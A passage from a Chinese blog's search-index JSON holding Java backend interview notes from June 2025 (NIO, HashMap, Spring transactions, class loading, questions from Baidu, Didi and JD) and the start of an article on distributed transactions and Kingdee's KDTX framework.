‌结论‌：HashMap 扩容 2 倍是性能（位运算）、空间（均匀分布）、迁移效率（高位判断）三重优化的工程权衡结果。 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:2:7","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"java nio 原理 - （Java NIO 原理：非阻塞 I/O 的高性能架构） Java NIO（New I/O）采用‌事件驱动模型‌解决传统阻塞 I/O 的并发瓶颈，核心是通过 ‌**Channel（通道）‌、‌Buffer（缓冲区）‌ 和 ‌Selector（选择器）**‌ 实现高效数据传输。其工作原理如下： 🔄 一、核心组件协同流程 ‌**Channel（通道）**‌ 替代传统 InputStream/OutputStream，支持‌双向读写‌（读/写可同时进行）。 类型：SocketChannel（TCP）、DatagramChannel（UDP）、FileChannel（文件）。 ‌非阻塞模式‌：调用 configureBlocking(false) 后，读写操作无数据时立即返回，避免线程阻塞。 ‌**Buffer（缓冲区）**‌ 本质是‌内存块数组‌（如 ByteBuffer, IntBuffer），作为数据中转站。 ‌工作流程： javaCopy Codebuffer.flip(); // 切换读模式（写→读） buffer.get(); // 读取数据 buffer.clear(); // 清空复用（读→写） ‌**Selector（选择器）**‌ ‌单线程管理多通道‌：通过系统调用（epoll/kqueue）监听所有注册的 Channel 事件。 事件类型： OP_READ（数据可读） OP_WRITE（通道可写） OP_CONNECT（连接就绪） ⚙ 二、事件驱动工作流程 javaCopy Code// 伪代码示例 Selector selector = Selector.open(); SocketChannel channel = SocketChannel.open(); channel.configureBlocking(false); channel.register(selector, SelectionKey.OP_READ); // 注册读事件 while (true) { int readyChannels = selector.select(); // 阻塞直到事件就绪 Set\u003cSelectionKey\u003e keys = selector.selectedKeys(); for (SelectionKey key : keys) { if (key.isReadable()) { SocketChannel ch = (SocketChannel) key.channel(); ByteBuffer buffer = ByteBuffer.allocate(1024); ch.read(buffer); // 非阻塞读取 buffer.flip(); // 处理数据... } keys.remove(key); } } ‌事件注册‌ Channel 向 Selector 注册关注的事件（如 OP_READ）。 ‌事件监听‌ selector.select() 调用底层 epoll，由操作系统通知就绪事件。 ‌事件处理‌ 遍历 selectedKeys() 处理就绪 Channel，单线程可处理数千连接。 ⚡️ 三、性能飞跃的关键设计 ‌特性‌ ‌传统阻塞 I/O‌ ‌Java NIO‌ ‌线程模型‌ 1 连接 = 1 线程（线程切换开销大） 单线程处理多连接（Selector 管理） ‌I/O 行为‌ 读写阻塞线程直至完成 无数据时立即返回（configureBlocking(false)） ‌数据操作‌ 流式传输（单向） 缓冲区批量读写（双向） ‌并发能力‌ 数百连接（线程数限制） 数万连接（C10K 问题解决方案） 💡 四、底层机制：多路复用（以 Linux 为例） ‌**epoll 核心优势**‌ ‌事件通知机制‌：仅返回就绪的 Channel 集合，无需遍历所有连接（时间复杂度 O(1)）。 ‌零拷贝支持‌：通过 FileChannel.transferTo() 实现内核态直接传输，避免用户态拷贝。 ‌与 Redis 多路复用对比‌ ‌相似点‌：均使用 epoll 实现单线程高并发。 ‌差异点‌：Redis 主线程处理所有逻辑，Java NIO 可将业务逻辑分发给工作线程池。 🚀 五、适用场景 ‌高并发服务器‌：Web 服务器（Netty）、消息中间件（RocketMQ）。 ‌大文件传输‌：零拷贝技术提升吞吐量。 ‌实时通信‌：WebSocket、游戏服务器。 💡 ‌注意事项‌： NIO 编程复杂度高（需处理拆包/粘包、异常恢复）。 推荐使用 ‌Netty‌ 等框架简化开发，其基于 NIO 封装了稳定高性能的 API。 通过 ‌Channel-Buffer-Selector ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:2:8","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"百度-Java ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:3:0","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"百度一面 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:3:1","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"redis的一致性hash ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:3:2","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"redis lua脚本 如何避免限流失败，过期时间，自动续期 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:3:3","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"分布式锁 zk redis ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:3:4","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"zk优缺点 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:3:5","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"网关 geteway、zuul分布式提高高可用，nginx ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:3:6","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"分析性能问题思路 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:3:7","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"找最高点算法 一个for ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:3:8","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"原地交换算法两个for ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:3:9","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"链表倒数500，经典双指针闭眼秒。 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:3:10","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"ip范围的优化 zset redis ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:3:11","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"百度二面 算法 字符串反转 有多少方法 快速排序 字符串常量池 创建了几个对象 1-2 集合stream解决问题 时间内（filter），金额最大 前五，（limit），映射为一个属性（map） 线程池参数 根据什么配置 如何创建线程 Runnable Callable Thread CompletableFuture 线程池 thredlocal 线程池内容相同下 synchronized 和 ReentrantLock 区别什么时候使用 jvm 垃圾处理器 cms和g1 cms有几个阶段，g1 他们的区别 redis lua 脚本为什么用于限流 nginx 分布式锁两种方式怎么实现的 mysql 执行计划的参数 index性能为什么不好（走了全部索引） 跨域怎么解决 （nginx 反带到允许域上，gateway设置允许域） Springboot常用的注解 zab和raft区别 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:3:12","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"滴滴-Java ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:4:0","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"滴滴一面 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:4:1","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"java base hasmap扩容为什么是两倍 ​ 充分散列 ​ 位移问题向高位移动 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:4:2","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"jvm cms和g1 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:4:3","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"redis 为什么速度快 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:4:4","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"mysql inodb ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:4:5","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"B+树和b树、和红黑树 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:4:6","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"acid是什么 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:4:7","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"怎么实现的持久性 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:4:8","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"滴滴二面 算法简单 第一列顺序，第二列倒叙排序 自己挖坑提到单调栈 要求实现，说java有，糊弄过去了 pb级别文件排序（多路归并），描述归并排序 mysql select * from tbl where a=1 select * from tbl where b=2 and a=1 select * from tbl where c=3 and b=2 and a=1 abc联合索引 哪个走联合索引 第二个和第三个一定不走吗 第一个什么情况不走索引 redis redis项目做什么 做分布式锁做注意什么 设计方案 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:4:9","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"高德-Java sql优化手段 activiti比flowable等框架好在哪 设计一个系统 1高并发，不能重复 幂等问题 2一致性?高可用?吞吐量？不记得了，面完应该直接写的 3熔断限流 重试次数，死信队列，lua脚本限制 消息的库表需要什么字段 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:5:0","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"京东物流-Java ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:6:0","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"京东物流一面 加载过程，类加载到静态方法区 在Java中，类的加载过程涉及到Java虚拟机（JVM）的类加载器（Class Loader）机制。这个过程大致可以分为以下几个阶段： 加载（Loading）： 这一阶段主要是将类的字节码从不同的来源（如文件系统、网络等）加载到JVM中。 类加载器（如Bootstrap ClassLoader, Extension ClassLoader, System ClassLoader或自定义类加载器）负责查找并加载类的二进制数据。 链接（Linking）： 验证（Verification）：确保被加载的类的正确性，例如检查字节码的格式是否正确，是否符合Java语言规范。 准备（Preparation）：为类的静态变量分配内存，并设置默认初始值（如int类型变量默认为0，对象引用默认为null）。 解析（Resolution）：将类、接口、字段和方法的符号引用转换为直接引用。这一步骤可能在初始化之前完成，也可能在初始化时完成。 初始化（Initialization）： 执行类中的静态初始化器和静态初始化块。这是Java代码执行的最后一步，此时静态变量被赋予正确的值，静态代码块被执行。 使用（Using）： 程序通过创建类的实例或使用类的静态变量和方法来使用类。 卸载（Unloading）： 当类不再被使用时，JVM会卸载这个类。这通常发生在类的Class对象没有在任何地方被引用时。 值得注意的是，在Java中，静态方法区（也称为方法区或Metaspace，在Java 8及之后版本中称为Metaspace而非永久代PermGen）是用来存储每个类的结构信息，如运行时常量池（Runtime Constant Pool）、字段和方法数据、构造函数和普通方法的字节码内容等。它与类的加载和链接阶段密切相关，但不直接涉及初始化过程。 ** 静态方法区与类加载过程的关系：** 方法区 主要存储了类的元数据信息，包括类的字段信息、方法信息、常量池等。这些信息在类加载的链接阶段就已经准备好了。 初始化 主要涉及的是执行类的静态代码块和静态变量的初始化，这部分是在加载和链接之后进行的。 因此，可以说静态方法区是存储了类的元数据的地方，而类的初始化过程则是在这些元数据基础上进行的。两者共同构成了Java中类的完整生命周期的一部分。 java线程池底层机制 spring事务失效 的情况 Spring 事务失效是指使用 @Transactional 注解时，事务行为未按预期执行（如未回滚），常见于以下 8 种场景，其失效原理与解决方案如下： 🔧 一、Spring 事务失效的 8 种核心场景 ‌场景‌ ‌失效原因‌ ‌解决方案‌ ‌1. 非 public 方法‌ Spring 动态代理仅拦截 public 方法，私有/包级方法无法被代理增强事务 将事务方法设为 public ‌**2. 自调用（内部调用）**‌ 类内方法通过 this 调用事务方法，绕过代理对象 通过代理对象调用（如 AopContext.currentProxy()）或拆分到不同 Bean ‌3. 异常处理不当‌ • 默认仅回滚 RuntimeException 和 Error • 捕获异常未抛出，Spring 无法感知 配置 @Transactional(rollbackFor = Exception.class) 或在 catch 中抛出 RuntimeException56 ‌4. 多线程调用‌ 子线程与父线程事务上下文隔离，数据库连接不同 避免多线程操作，或使用分布式事务管理器 ‌5. 数据库引擎不支持‌ 如 MySQL 的 MyISAM 引擎不支持事务 改用 InnoDB 等支持事务的引擎 ‌6. 方法被 final/static 修饰‌ 代理类无法重写 final 方法；static 方法不属于实例，无法被代理 移除 final/static 修饰符 ‌7. 未被 Spring 管理‌ 类未标注 @Component 等注解，Spring 无法创建代理 确保 Bean 被 Spring 容器扫描 ‌8. 错误的事务传播机制‌ 如配置 Propagation.NOT_SUPPORTED（以非事务运行） 调整传播行为（如默认 REQUIRED） ⚙️ 二、事务传播机制（Propagation）与事务边界 Spring 通过传播机制控制事务边界，常见类型如下： ‌传播类型‌ ‌行为描述‌ ‌典型场景‌ ‌REQUIRED‌（默认） 当前有事务则加入，无事务则新建 多数业务场景（如订单扣库存） ‌REQUIRES_NEW‌ 挂起当前事务，始终新建独立事务（新事务回滚不影响原事务） 日志记录、独立操作（如发送短信） ‌NESTED‌ 在当前事务内嵌","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:6:1","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"京东物流二面 低代码架构 流程架构 mq重试 数据量多 压力大的部分 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:6:2","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"百度搜索-c++ c++ 共享指针 内存分配 new对象过程 操作系统 页缓存 tlb cpu缓存 ai rag底层流程 spring 好在哪 依赖注入、控制反转属于什么设计模式 子序列最大 贪心做的 反转链表 用c++ 内存池 太长没做 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:7:0","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"飞书-Java java 抽象类、普通类 、接口的区别 反射的原理 还有什么方式动态实现 用过什么锁 sync、reen、分布式锁 不同情况用什么 redis 项目使用 序列化方式？？？？ 争论mq的push和pull 设计定时任务调度+高并发 算法 三数之和 ","date":"2025-06-12","objectID":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:8:0","tags":[],"title":"刘同学的面经(2025-6)","uri":"/posts/%E5%88%98%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"北京超星 一面 ","date":"2025-06-12","objectID":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:0","tags":[],"title":"叶同学的面经(2025-6)","uri":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"1.sql调优相关，有哪些方式调优 ","date":"2025-06-12","objectID":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:1","tags":[],"title":"叶同学的面经(2025-6)","uri":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"2.索引失效的情况 ","date":"2025-06-12","objectID":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:2","tags":[],"title":"叶同学的面经(2025-6)","uri":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"3.Java中的集合 ","date":"2025-06-12","objectID":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:3","tags":[],"title":"叶同学的面经(2025-6)","uri":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"4.集合与hashmap的差异(集合之间 list hashset 。集合和hashmap) ","date":"2025-06-12","objectID":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:4","tags":[],"title":"叶同学的面经(2025-6)","uri":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"5.hashmap扩容机制 ","date":"2025-06-12","objectID":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:5","tags":[],"title":"叶同学的面经(2025-6)","uri":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"6.线程的创建方式 ","date":"2025-06-12","objectID":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:6","tags":[],"title":"叶同学的面经(2025-6)","uri":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["java面试"],"content":"7.线程池的参数 ","date":"2025-06-12","objectID":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/:1:7","tags":[],"title":"叶同学的面经(2025-6)","uri":"/posts/%E5%8F%B6%E5%90%8C%E5%AD%A6%E7%9A%84%E9%9D%A2%E7%BB%8F2025-6/"},{"categories":["Java后端"],"content":"1. 简介 ","date":"2025-06-07","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/:1:0","tags":[],"title":"kd-分布式事务","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"categories":["Java后端"],"content":"1.1 什么是分布式事务 分布式事务就是指事务的参与者、支持事务的服务器、资源服务器以及事务管理器分别位于不同的分布式系统的不同节点之上。通俗的说就是某个操作中的事务跨了多个库，或者是跨了多个服务节点而产生了分布式事务，所以一般来讲就是分库分表或者微服务化导致了分布式事务的产生。而本地事务的所有操作都是在某一个库中进行。 ","date":"2025-06-07","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/:1:1","tags":[],"title":"kd-分布式事务","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"categories":["Java后端"],"content":"1.2 CAP定理，Base理论 CAP 原则又称 CAP 定理，指的是分布式系统的几个特性: 一致性（Consistency） 在分布式系统中的所有数据备份，在同一时刻是否同样的值。（等同于所有节点访问同一份最新的数据副本） 可用性（Availability） 在集群中一部分节点故障后，集群整体是否还能响应客户端的读写请求。（对数据更新具备高可用性） 分区容错性（Partition tolerance） - 大多数分布式系统都分布在多个子网络。每个子网络就叫做一个区（partition）。 分区容错的意思是，区间通信可能失败。比如，一台服务器放在中国，另一台服务 器放在美国，这就是两个区，它们之间可能无法通信。 CAP 原则指的是，这三个要素最多只能同时实现两点，不可能三者兼顾。 Base理论是对 CAP 理论的延伸，思想是即使无法做到强一致性（CAP 的一致性就是强一致性），但可以采用适当的采取弱一致性，即最终一致性。 基本可用（Basically Available） 基本可用是指分布式系统在出现故障的时候，允许损失部分可用性（例如响应时间、 功能上的可用性），允许损失部分可用性。需要注意的是，基本可用绝不等价于系统不可用。响应时间上的损失：正常情况下搜索引擎需要在 0.5 秒之内返回给用户相应的 查询结果，但由于出现故障（比如系统部分机房发生断电或断网故障），查询 结果的响应时间增加到了 1~2 秒。功能上的损失：购物网站在购物高峰（如双十一）时，为了保护系统的稳定性， 部分消费者可能会被引导到一个降级页面。 软性状态（ Soft State） 是指允许系统中的数据存在中间状态，并认为该中间状态的存在不会影响系统的整体可用性，即允许系统不同节点的数据副本之间进行数据同步的过程存在延时。 最终一致性（ Eventual Consistency） 同一数据的不同副本的状态，可以不需要实时一致，但一定要保证经过一定时间后仍然是一致的。 BASE理论是对CAP中的一致性和可用性进行一个权衡的结果，理论的核心思想就是：我们无法做到强一致，但每个应用都可以根据自身的业务特点，采用适当的方式来使系统达到最终一致性（Eventual consistency）。 ","date":"2025-06-07","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/:1:2","tags":[],"title":"kd-分布式事务","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"categories":["Java后端"],"content":"1.3 分布式事务的几种解决方案 基于CAP定理和Base理论，目前常用的解决方案有以下几种: 两阶段提交/XA方案 TCC方案 三阶段提交方案 本地消息表 可靠消息最终一致 最大努力通知 目前流行的分布式事务框架Seata,LCN,Saga等。 ","date":"2025-06-07","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/:1:3","tags":[],"title":"kd-分布式事务","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"categories":["Java后端"],"content":"1.4 苍穹分布式事务KDTX的特点 弱一致 最终一致模式实现数据弱一致性，适合苍穹里大部分的分布式事务场景 强一致 TCC模式实现数据强一致性，解决某些对数据一致性很高的场景需求 很简单 使用最终一致模式，现有的业务代码改造量很小，非常容易上手 高性能 接入了KDTX之后保证了数据一致性的同时，原有的业务TPS几乎不变 可监控 当出现数据不一致时系统会马上介入并告警，并提供监控 ","date":"2025-06-07","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/:1:4","tags":[],"title":"kd-分布式事务","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"categories":["Java后端"],"content":"2. KDTX详细介绍 苍穹平台提供的分布式事务解决方案,简称KDTX(（Kingdee Distributed Transaction）。 ","date":"2025-06-07","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/:2:0","tags":[],"title":"kd-分布式事务","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"categories":["Java后端"],"content":"2.1 KDTX产生背景 应用内跨库调用 跨应用调用 应用内跨事务调用 ","date":"2025-06-07","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/:2:1","tags":[],"title":"kd-分布式事务","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"categories":["Java后端"],"content":"2.2 系统架构图 ","date":"2025-06-07","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/:2:2","tags":[],"title":"kd-分布式事务","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"categories":["Java后端"],"content":"2.3 支持的模式 2.3.1 最终一致模式 最终一致模式可以保证跨数据库或跨节点更新时的数据一致。它会以1个更新操作为基准，注册多个其它更新操作，最终保证所有更新都成功，实现分布式事务的弱一致性。最终一致模式非常适合这样的场景： 对本身的业务做更新，同时还要更新外部系统的数据，而这些外部更新稍微晚点完成也可以接受，但最终必须要都能成功。苍穹里的大部分分布式事务场景应该优先考虑使用最终一致。最终一致模式内部使用MQ或者微服务调用实现事务协调，默认使用MQ。使用微服务调用时，也可以设置使用同步或者异步模式。使用MQ模式或者微服务模式，性能会更佳。 使用限制：(有以下情况不建议使用) 